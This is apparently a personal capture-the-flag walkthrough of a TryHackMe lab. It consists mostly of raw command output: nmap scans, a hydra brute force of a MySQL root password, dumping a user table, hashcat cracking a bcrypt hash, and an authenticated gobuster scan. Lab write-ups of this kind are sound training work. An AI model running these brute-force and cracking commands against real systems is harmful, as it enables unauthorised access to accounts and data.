<code>
https://tryhackme.com/room/ettubrute

## Service enumetration

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 18:5a:d4:0f:2c:ae:36:9d:35:9c:83:af:da:85:a0:75 (RSA)
|   256 8b:72:5d:b3:75:27:26:6d:3f:a3:41:23:27:1e:cb:4e (ECDSA)
|_  256 6f:58:b9:06:ee:97:de:5e:64:76:55:00:4d:be:47:e7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-10-19T04:00:09
|_Not valid after:  2031-10-17T04:00:09
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.20.04.1
|   Thread ID: 51
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongPassword, SupportsCompression, FoundRows, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, ODBCClient, SupportsLoadDataLocal, LongColumnFlag, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 4~L\x02ed`RsB\x08q1\x01E!L1~.
|_  Auth Plugin Name: caching_sha2_password
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

## mysql user Enumeration
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 11:50 CEST
Nmap scan report for 10.10.7.238
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_mysql-empty-password: ERROR: Script execution failed (use -d to debug)
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 1 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.20.04.1
|   Thread ID: 116
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, InteractiveClient, LongPassword, SupportsLoadDataLocal, FoundRows, DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x15MGc\x1AmwX\x13bw\x1BE\x0BhH\x1Buf\x19
|_  Auth Plugin Name: caching_sha2_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds


## password brute force sql
hydra -l root -P ../../www/wordlists/rockyou.txt 10.10.81.109 mysql
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-16 15:25:58
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.10.81.109:3306/
[3306][mysql] host: 10.10.81.109   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-16 15:26:00



## mysql Enumeration


MySQL [mysql]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> select * from user;
ERROR 1146 (42S02): Table 'website.user' doesn't exist
MySQL [website]> select * from userss;
ERROR 1146 (42S02): Table 'website.userss' doesn't exist
MySQL [website]> select * from userss
    -> select * from userss;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select * from userss' at line 2
MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.033 sec)

MySQL [website]> 


──(kali㉿kali)-[~/Documents/THM/THM_Brute]
└─$ cat hash.txt 
$A$005$n:{T^3%/{5=+Z0Y1zOxlUB7mIrlVbAxA5t4ARcqMaY6i4k1AhaU2/W1

## Adrian Hash creaking                                                                                                                                        

┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
└─$ hashcat hash.txt -m 3200 ../../../Documents/www/wordlists/rockyou.txt
hashcat (v6.2.6) starting
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Dictionary cache built:
* Filename..: ../../../Documents/www/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

**$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger**
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Tue May 20 12:35:32 2025 (1 sec)
Time.Estimated...: Tue May 20 12:35:33 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../../../Documents/www/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       40 H/s (3.68ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32/14344385 (0.00%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 16/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 654321 -> butterfly

Started: Tue May 20 12:34:47 2025
Stopped: Tue May 20 12:35:34 2025

## credentials Adrian:tigger - only for web service not for ftp/ssh

## gobuster with credentials - nothing

┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.210.144 -x .php, .txt, .html -c PHPSESSID=6mf4a6dknljbg7it5dvurulukb

/.                    (Status: 302) [Size: 0] [--> welcome.php]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 0] [--> welcome.php]
/welcome.php          (Status: 200) [Size: 631]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 1080]
/server-status        (Status: 403) [Size: 278]
Progress: 661680 / 661683 (100.00%)
                                                                    

